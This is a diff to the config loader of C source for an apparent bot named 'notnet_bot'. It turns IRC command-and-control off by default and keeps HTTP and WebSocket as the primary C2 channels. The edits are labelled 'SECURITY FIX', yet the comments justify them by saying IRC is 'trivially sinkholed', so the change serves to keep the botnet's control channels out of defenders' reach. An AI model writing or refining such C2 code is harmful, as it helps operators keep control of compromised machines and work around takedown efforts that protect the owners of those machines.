@@ -2990,7 +2990,7 @@ int load_config(notnet_bot_t *bot, const char *path) {
     /* SECURITY FIX (#82): Explicit enable/disable keys. Track whether each
      * was seen so the port-based auto-detect below cannot override an
      * explicit <proto>_enabled=0. */
-    int irc_explicit = 0, http_explicit = 0, ws_explicit = 0;
+    int http_explicit = 0, ws_explicit = 0;
     
     char line[256];
     while (fgets(line, sizeof(line), f)) {
@@ -3216,7 +3216,10 @@ int load_config(notnet_bot_t *bot, const char *path) {
          * implies the protocol is wanted, but to disable a protocol while
          * keeping its default port, set <proto>_enabled=0. */
         } else if (strcmp(key, "irc_enabled") == 0) {
-            irc_explicit = 1;
+            /* SECURITY FIX (#87): IRC C2 is deprecated — off by default.
+             * Only an explicit irc_enabled=1 re-enables it; the port-based
+             * auto-detect below no longer enables IRC. Code stays intact for
+             * compatibility. */
             if (atoi(value) != 0) bot->c2_enabled |= C2_IRC;
             else bot->c2_enabled &= ~C2_IRC;
         } else if (strcmp(key, "http_enabled") == 0) {
@@ -3284,11 +3287,10 @@ int load_config(notnet_bot_t *bot, const char *path) {
     
     /* Auto-detect enabled protocols from config.
      * SECURITY FIX (#82): Port-based auto-detect only applies when no
-     * explicit <proto>_enabled key was given. An explicit 0 must stick. */
-    if (!irc_explicit && bot->c2_irc.port != IRC_DEFAULT_PORT) {
-        bot->c2_enabled |= C2_IRC;
-        log_info("C2: IRC enabled (%s:%d)", bot->c2_irc.server, bot->c2_irc.port);
-    }
+     * explicit <proto>_enabled key was given. An explicit 0 must stick.
+     * SECURITY FIX (#87): IRC is excluded from auto-detect — deprecated,
+     * trivially sinkholed, off by default; only explicit irc_enabled=1
+     * re-enables it. HTTP/WS remain the primary channels. */
     if (!http_explicit && bot->c2_http.port != HTTP_DEFAULT_PORT) {
         bot->c2_enabled |= C2_HTTP;
         log_info("C2: HTTP enabled (%s:%d)", bot->c2_http.server, bot->c2_http.port);
